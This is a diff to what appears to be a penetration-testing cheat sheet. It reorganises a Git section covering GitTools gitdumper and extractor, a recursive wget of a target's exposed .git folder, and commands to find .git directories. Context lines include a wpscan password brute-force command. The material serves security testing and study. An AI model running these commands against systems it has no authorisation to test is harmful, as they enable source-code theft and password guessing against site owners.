@@ -322,13 +322,6 @@ wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
 ~~~
 
 
-## GitTools
-
-~~~ bash
-./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
-./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
-~~~
-
 ## php://filter Wrapper
 
 ~~~ bash
@@ -1397,10 +1390,26 @@ chmod a+x ./linpeas.sh
 
 # Git
 
-## Find .git
+## Find .git from host
 
 ~~~ cmd
 dir /s /b /ah C:\.git
+find / -name .git 2>/dev/null
+~~~
+
+## Download .git from web
+
+~~~ bash
+wget -r http://target/.git/
+~~~
+
+## GitTools
+
+[https://github.com/internetwache/GitTools](https://github.com/internetwache/GitTools)
+
+~~~ bash
+./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
+./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
 ~~~
 
 ## Examining the Git repository
